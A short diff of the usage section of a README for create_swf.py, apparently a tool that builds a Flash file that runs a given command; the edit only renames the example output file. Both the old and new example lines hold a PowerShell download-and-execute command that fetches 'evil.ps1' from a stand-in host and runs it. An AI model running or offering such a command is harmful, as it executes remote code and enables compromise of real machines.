@@ -15,7 +15,7 @@ Usage:
 
 Example Usage:
 
-```python create_swf.py "powershell.exe IEX (iwr 'http://192.168.56.101/evil.ps1')" test.swf```
+```python create_swf.py "powershell.exe IEX (iwr 'http://192.168.56.101/evil.ps1')" downloadtest.swf```
   
 
 
